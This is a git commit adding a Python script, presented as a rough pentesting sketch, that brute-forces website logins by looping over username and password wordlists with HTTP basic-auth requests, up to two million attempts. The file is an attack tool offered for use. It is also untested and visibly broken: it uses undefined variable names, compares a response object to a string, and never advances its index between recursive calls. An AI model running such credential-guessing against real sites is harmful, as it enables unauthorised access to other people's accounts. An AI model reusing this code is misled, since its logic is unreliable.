8c9c0fde00c20eceaec87ef6966e8876313373bd
LoganRan625 <75424234+LoganRan625@users.noreply.github.com>
2021-08-12 13:26:18 -0700

    Add files via upload
    quick sketch up of a possible pentesting tool for bruteforcing websites that need username/password

---
+++ bruteforce_https.py
@@ -0,0 +1,74 @@
+#!/bin/python3
+
+import requests
+import os
+import time
+
+
+ ##### BRUTE FORCE WEBSITE CREDENTIALS ########################################################
+ #
+ # NAME: bruteforce https
+ # TYPE: Python
+ # DATE: 08/12/21
+ # purpose:  might possibly be able to brutefoce a website requiring username and password
+ #           might be issues with timeout for each request, mostlikely would work best on
+ #           simple home servers with simple sites and not much secutiry.
+ #
+ # requirements: large password and username list files.
+ # NOTES: never tested code on a server, may not work at all just a quick sketch up of an idea
+ #        that popped into my head.
+ ##############################################################################################
+
+
+webpage = "" # name of webpage
+positive_request = "<Response [200]>" # if password and username match you will get a response of 200
+									  # check r to see result
+
+pass_file = "" # name of text file with list of passwords
+user_file = "" # name of text file with list of usernames
+
+SET_LIMIT = 2000000  # set a limit of how many requests can be made
+passwords = [] # list of all passwords from file
+usernames = [] # list of all usernames from file
+info_list = [pass_file, user_file] # simplifies the FILE_DATA() function: uses one isntead of seperate
+								   # for loops
+
+
+def FILE_DATA(): # converts files with passwords or username for each line into a python list
+	try:
+		for object in info_list:
+			with open(object, 'r') as file:
+				for line in file:
+					if object == pass_file:
+						passwords.append(line)  # passwords list
+					else:
+						usernames.append(line)	# usernames list
+				print(f"[{FILE_DATA.__name__}] password list stored")
+	except:
+		print(f"[{FILE_DATA.__name__}] Error: could not find password file")
+
+
+def REQUEST(): # ask website to login with specific credentials
+	count_ = 0 # counts iterations
+	try: # trys request to connect with username and password based on iterations
+		r = requests.get(webpage)
+		if r.ok == False:
+			print(f"[{REQUEST.__name__}] issue with address, or connection")
+			exit()
+		r = requests.get(webpage, auth=(str(username[count_]), str(password[count_])))
+		# time.sleep(0.1) # could have issues with sending and receiving to quickly
+		# if timeout per request scripts is useless on that server.
+
+		if r != positive_request: # 200 is possitive everything else is an error
+			count_ += 1
+			if count_ >= SET_LIMIT:
+				print(f"[{REQUEST.__name__}] Limit Reached {SET_LIMIT}")
+			REQUEST()
+		else:
+			print(f"[{REQUEST.__name__}] Error: count exceeds SET_LIMIT {SET_LIMIT}")
+	except:
+		print(f"[{REQUEST.__name__}] Error: try: in  'r = request.get()'")
+
+if __name__ == '__main__':
+	FILE_DATA()
+	REQUEST()
